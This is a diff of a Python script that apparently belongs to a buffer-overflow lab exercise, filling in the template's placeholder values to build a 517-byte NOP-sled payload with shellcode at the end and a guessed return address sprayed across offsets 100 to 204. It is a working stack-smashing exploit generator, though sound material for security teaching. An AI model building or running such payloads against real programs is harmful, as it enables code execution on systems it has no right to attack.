@@ -26,15 +26,18 @@ content = bytearray(0x90 for i in range(517))
 
 ##################################################################
 # Put the shellcode somewhere in the payload
-start = 0               # Change this number 
+start = 517-len(shellcode)               # Change this number 
 content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value 
 # and put it somewhere in the payload
-ret    = 0xAABBCCDD     # Change this number 
-offset = 0              # Change this number 
+ret = 0xffffd2d8 + 360     # Change this number 
+# offset = 0              # Change this number 
 
 # Use 4 for 32-bit address and 8 for 64-bit address
+for offset in range(100, 204, 4):
+   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
+	
 content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
 ##################################################################
 
